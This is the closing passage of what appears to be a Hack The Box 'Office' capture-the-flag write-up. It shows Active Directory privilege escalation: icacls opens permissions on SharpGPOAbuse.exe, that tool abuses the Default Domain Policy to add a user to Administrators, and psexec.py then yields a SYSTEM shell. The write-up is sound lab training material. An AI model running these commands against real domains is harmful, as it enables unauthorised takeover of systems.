<span class=line></span></code></pre><p><img alt=img decoding=async height=140 loading=lazy src=/_astro/Pasted%20image%2020240619211959.BdcmxAHF_2krpMk.webp width=959></p><blockquote><p>Tip: Make sure to upload <code>SharpGPOAbuse.exe</code> as the user <code>HHogan</code>, otherwise you will need to grant <code>Full</code> privileges to the <code>Everyone</code> group for this executable.</p></blockquote><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>icacls</span><span style=color:#9ecbff> C:</span><span style=color:#79b8ff>\w</span><span style=color:#9ecbff>indows</span><span style=color:#79b8ff>\t</span><span style=color:#9ecbff>asks</span><span style=color:#79b8ff>\S</span><span style=color:#9ecbff>harpGPOAbuse.exe</span><span style=color:#9ecbff>  /grant</span><span style=color:#9ecbff> Everyone:</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>F</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><p>{: .prompt-tip }</p><ul><li>Then execute <code>SharpGPOAbuse.exe</code> with the payload that will add the user <code>HHogan</code> to the <code>Administrators</code> group. Nice! He executed it and successfully added the user <code>HHogan</code>.</li></ul><pre class="astro-code github-dark" data-language=shell style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>c:\Windows\Tasks\SharpGPOAbuse.exe</span><span style=color:#79b8ff> --AddLocalDomain</span><span style=color:#79b8ff> --UserAccount</span><span style=color:#9ecbff> HHogan</span><span style=color:#79b8ff> --GPOName</span><span style=color:#9ecbff> "Default Domain Policy"</span></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=661 loading=lazy src=/_astro/Pasted%20image%2020240619212309.DWv4VAkb_6NK8t.webp width=1183></p><ul><li>Finally, with <code>psexec.py</code> from the Impacket Suite, it’s possible to obtain a shell as <code>NT Authority\System</code> and read <code>root.txt</code>.</li></ul><p><img alt=img decoding=async height=356 loading=lazy src=/_astro/Pasted%20image%2020240619213751.BoWeoTDC_Z1Thx7G.webp width=715></p></div><div class="transition overflow-hidden bg-[var(--license-block-bg)] license-container mb-6 onload-animation px-6 py-5 relative rounded-xl"><div class="transition font-bold dark:text-white/75 text-black/75">Office HTB Writeup</div><a href=https://fuwari.vercel.app/posts/office/ class="text-[var(--primary)] link">https://fuwari.vercel.app/posts/office/</a><div class="flex gap-6 mt-2"><div><div class="transition text-sm dark:text-white/30 text-black/30">Author</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">Mil4ne</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">Published at</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">2024-07-01</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">License</div><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="text-[var(--primary)] link whitespace-nowrap" target=_blank>CC BY-NC-SA 4.0</a></div></div><svg data-icon=fa6-brands:creative-commons height=240 viewBox="0 0 496 512" width=240 class="transition absolute pointer-events-none -translate-y-1/2 dark:text-white/5 right-6 text-black/5 top-1/2"><symbol id=ai:fa6-brands:creative-commons><path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86m143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86M247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248m.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:creative-commons></use></svg></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/jab/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full justify-start btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl"><svg data-icon=material-symbols:chevron-left-rounded height=32 viewBox="0 0 24 24" width=32 class=text-[var(--primary)]><symbol id=ai:material-symbols:chevron-left-rounded><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Jab HTB Writeup</div></div></a><a href=/posts/analysis/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl justify-end"><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Analysis HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=32 viewBox="0 0 24 24" width=32 class=text-[var(--primary)]><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-sm text-50">© 2024 Mil4ne. All Rights Reserved.<br>Powered by <a href=https://github.com/mil4ne class="text-[var(--primary)] link font-medium" target=_blank>Mil4ne</a></div></div></div><div class="hidden lg:block back-to-top-wrapper" data-astro-cid-5w2ap42j><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-5w2ap42j onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-5w2ap42j><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-5w2ap42j><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>